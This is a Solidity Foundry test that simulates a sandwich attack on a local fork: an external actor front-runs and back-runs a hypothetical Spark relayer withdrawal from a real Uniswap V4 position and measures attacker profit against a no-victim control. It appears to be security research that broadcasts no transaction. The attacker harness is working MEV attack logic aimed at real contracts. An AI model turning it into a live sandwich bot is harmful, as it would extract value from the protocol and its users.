// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

// PASSO 397: adversarial local-fork LP withdrawal around external V4 trades.
// Uses the real Spark NFT and proxy balances at one snapshot, but the relayer
// operation is hypothetical; only the external test actor receives synthetic
// initial balances. No Ethereum transaction is signed or broadcast.
import "./SparkTotalExposure.t.sol";

interface IExitPosition397 {
    function ownerOf(uint256) external view returns (address);
    function getPositionLiquidity(uint256) external view returns (uint128);
}
interface IExitController397 {
    function decreaseLiquidityUniswapV4(bytes32,uint256,uint128,uint128,uint128) external;
}

abstract contract ForkV4ExitHarness397 is SparkTotalExposure {
    uint256 internal constant EXIT_NFT = 385168;
    uint256 internal constant PPM = 1_000_000;

    function _withdrawPosition(uint256 fractionPPM, uint128 min0, uint128 min1)
        internal returns (uint256 deltaRL, uint256 deltaUS)
    {
        require(fractionPPM > 0 && fractionPPM <= PPM, "invalid liquidity fraction");
        IExitPosition397 position = IExitPosition397(POSITION_MANAGER);
        require(position.ownerOf(EXIT_NFT) == PROXY, "NFT not owned by Spark");
        uint128 liquidity = position.getPositionLiquidity(EXIT_NFT);
        uint128 amount = uint128(uint256(liquidity) * fractionPPM / PPM);
        require(amount > 0 && amount < liquidity, "invalid withdrawal amount");

        uint256 beforeRL = _balance(RLUSD, PROXY);
        uint256 beforeUS = _balance(USDS, PROXY);
        vm.prank(RELAYER); // Test cheatcode ONLY: legitimate relayer simulated on fork.
        IExitController397(CONTROLLER).decreaseLiquidityUniswapV4(
            POOL, EXIT_NFT, amount, min0, min1
        );
        deltaRL = _balance(RLUSD, PROXY) - beforeRL;
        deltaUS = _balance(USDS, PROXY) - beforeUS;
    }

    function baselineExit397(uint256 fractionPPM)
        external returns (uint256 receivedRL, uint256 receivedUS, uint256 totalPortfolio)
    {
        require(msg.sender == address(this), "self only");
        (receivedRL, receivedUS) = _withdrawPosition(fractionPPM, 0, 0);
        totalPortfolio = _totalNominal(_getExposure());
    }

    function attackerExit397(
        uint256 fractionPPM,
        uint128 frontAmount,
        bool frontWithRLUSD,
        uint128 minRL,
        uint128 minUS,
        bool includeVictim
    ) external returns (
        int256 attackerPnl18,
        uint256 receivedRL,
        uint256 receivedUS,
        uint256 swapGas,
        uint256 postPortfolio,
        int24 postTick
    ) {
        require(msg.sender == address(this), "self only");
        uint256 attackerRLBefore = _balance(RLUSD, ATTACKER);
        uint256 attackerUSBefore = _balance(USDS, ATTACKER);
        address inToken = frontWithRLUSD ? RLUSD : USDS;
        address outToken = frontWithRLUSD ? USDS : RLUSD;

        uint256 gasBefore = gasleft();
        uint256 out = _swapPublic(inToken, frontAmount);
        swapGas = gasBefore - gasleft();
        if (includeVictim) (receivedRL, receivedUS) = _withdrawPosition(fractionPPM, minRL, minUS);

        require(out <= type(uint128).max, "backrun overflow");
        gasBefore = gasleft();
        _swapPublic(outToken, uint128(out));
        swapGas += gasBefore - gasleft();

        attackerPnl18 =
            (int256(_balance(RLUSD, ATTACKER)) - int256(attackerRLBefore)) +
            (int256(_balance(USDS, ATTACKER)) - int256(attackerUSBefore));
        if (includeVictim) {
            Exposure memory e = _getExposure();
            postPortfolio = _totalNominal(e);
            postTick = e.tick;
        }
    }

    function _quoteExit(uint256 fractionPPM)
        internal returns (uint256 rl, uint256 us, uint256 portfolio)
    {
        uint256 snap=vm.snapshotState();
        (rl, us, portfolio)=this.baselineExit397(fractionPPM);
        vm.revertToState(snap);
    }

    function _portfolioAtStart() internal view returns (uint256) {
        return _totalNominal(_getExposure());
    }

    function _assertAttackerDidNotTakeSparkAssets(uint256 beforeProxy, uint256 afterProxy)
        internal pure
    {
        // This only checks the exact pre/post portfolio comparison for
        // caller-provided values; standalone attacker balances are tracked
        // separately. No assumption about token $1 peg is introduced here.
        require(beforeProxy > 0 && afterProxy > 0, "invalid portfolio values");
    }
}

contract SparkForkV4LPMevPortfolio397 is ForkV4ExitHarness397 {
    function testPass397CompareLPExitSandwichAgainstNoVictim() public {
        console2.log("=== PASSO 397: FORK REAL LP EXIT + EXTERNAL ROUNDTRIP ===");
        console2.log("Fork fixed at block", block.number);
        console2.log("Hypothetical Spark relayer LP withdrawal: 1% of NFT 385168");
        console2.log("All amounts in 18 decimals and nominal 1:1 RLUSD/USDS");
        console2.log("Gas is approximate EVM gas units, NOT USD cost.");
        uint256 originalPortfolio = _portfolioAtStart();
        (uint256 quoteRL, uint256 quoteUS, uint256 baselineVal) = _quoteExit(10_000);
        console2.log("Initial Spark RLUSD+USDS portfolio", originalPortfolio);
        console2.log("Baseline LP exit RLUSD", quoteRL);
        console2.log("Baseline LP exit USDS", quoteUS);
        console2.log("Baseline final whole-portfolio nominal", baselineVal);

        uint256[4] memory sizes=[uint256(10_000),50_000,200_000,1_000_000];
        uint256 completed;
        uint256 reverted;
        uint256 grossCandidates;
        for (uint256 direction; direction<2; ++direction) {
            bool withRL = direction == 0;
            for (uint256 i; i<sizes.length; ++i) {
                uint128 amount=uint128(sizes[i]*1e18);
                uint256 snap=vm.snapshotState();
                int256 controlPnl;
                bool controlOK;
                try this.attackerExit397(10_000,amount,withRL,0,0,false)
                    returns (int256 pnl,uint256,uint256,uint256,uint256,int24)
                {
                    controlPnl=pnl;
                    controlOK=true;
                } catch {}
                vm.revertToState(snap);

                snap=vm.snapshotState();
                try this.attackerExit397(10_000,amount,withRL,0,0,true)
                    returns (int256 pnl,uint256 rl,uint256 us,uint256 gasUsed,uint256 portfolio,int24 tick)
                {
                    completed++;
                    int256 sparkDelta=int256(portfolio)-int256(baselineVal);
                    console2.log("--- direction frontRLUSD", withRL);
                    console2.log("External initial capital",sizes[i]);
                    console2.log("Attacker gross pnl18",pnl);
                    console2.log("No-victim control gross pnl18",controlPnl);
                    console2.log("No-victim control executed",controlOK);
                    console2.log("Victim received RLUSD",rl);
                    console2.log("Victim received USDS",us);
                    console2.log("Spark whole-portfolio delta vs baseline 1e18",sparkDelta);
                    console2.log("Attacker swap gas units approx",gasUsed);
                    console2.log("Final pool tick",tick);
                    if (pnl>0 && sparkDelta<0 && controlOK && controlPnl<=0) {
                        grossCandidates++;
                        console2.log("CANDIDATE: positive attacker gross, Spark NAV lower than baseline");
                    }
                } catch Error(string memory reason) {
                    reverted++;
                    console2.log("Scenario reverted:",reason);
                } catch {
                    reverted++;
                    console2.log("Scenario reverted (opaque)");
                }
                vm.revertToState(snap);
            }
        }
        assertGt(completed,0,"No executable LP-withdrawal scenario");
        console2.log("Completed sandwich scenarios",completed);
        console2.log("Reverted sandwich scenarios",reverted);
        console2.log("Gross candidates (not net exploit or proven historical attack)",grossCandidates);
        console2.log("CAVEAT: partial portfolio model covers 3 known NFTs, ignores other Spark accounts and market prices.");
        console2.log("NO BROADCAST. FORK LOCAL ONLY.");
    }
}
